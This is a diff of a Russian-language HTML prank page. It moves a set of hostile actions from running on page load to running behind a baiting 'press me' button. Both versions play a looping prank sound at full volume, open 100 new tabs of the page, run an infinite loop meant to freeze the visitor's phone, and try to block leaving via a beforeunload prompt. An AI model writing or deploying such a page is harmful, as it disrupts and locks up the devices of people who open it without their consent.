@@ -17,48 +17,46 @@
             font-family: Arial, sans-serif;
             text-transform: uppercase;
             text-align: center;
-            cursor: pointer;
             flex-direction: column;
+        }
+        button {
+            font-size: 2rem;
+            padding: 20px;
+            margin-top: 20px;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
-    <div id="text">Заходи, не бойся!</div>
-    <audio id="sound" src="https://www.myinstants.com/media/sounds/stony-prank-mem-2025.mp3" autoplay loop></audio>
+    <div id="text">Нажми, если не лох</div>
+    <button onclick="startMadness()">НАЖМИ!</button>
+    <audio id="sound" src="https://www.myinstants.com/media/sounds/stony-prank-mem-2025.mp3" loop></audio>
 
     <script>
         let sound = document.getElementById("sound");
 
-        // Устанавливаем громкость на максимум (работает только в браузере)
-        function setMaxVolume() {
-            sound.volume = 1.0;
+        function startMadness() {
+            sound.volume = 1.0; // Громкость на максимум
+            sound.play().catch(err => console.log("Ошибка автозапуска:", err));
+
+            setTimeout(spamTabs, 1000); // Открытие вкладок через 1 секунду
+            setTimeout(freezePhone, 2000); // Запуск зависания через 2 секунды
         }
 
-        // Запуск бесконечного цикла для нагрузки процессора
-        function freezePhone() {
-            while (true) {
-                console.log("Телефон зависает...");
-            }
-        }
-
-        // Открытие множества вкладок
         function spamTabs() {
             for (let i = 0; i < 100; i++) {
                 window.open(window.location.href, '_blank');
             }
         }
 
-        // Блокировка выхода
+        function freezePhone() {
+            while (true) {
+                console.log("Телефон зависает...");
+            }
+        }
+
         window.onbeforeunload = function() {
             return "Ты точно хочешь уйти?";
-        };
-
-        // Запуск всего при загрузке страницы
-        window.onload = function() {
-            setMaxVolume();
-            sound.play().catch(err => console.log("Ошибка автозапуска:", err));
-            setTimeout(spamTabs, 1000); // Открытие вкладок через 1 секунду
-            setTimeout(freezePhone, 2000); // Запуск зависания через 2 секунды
         };
     </script>
 </body>
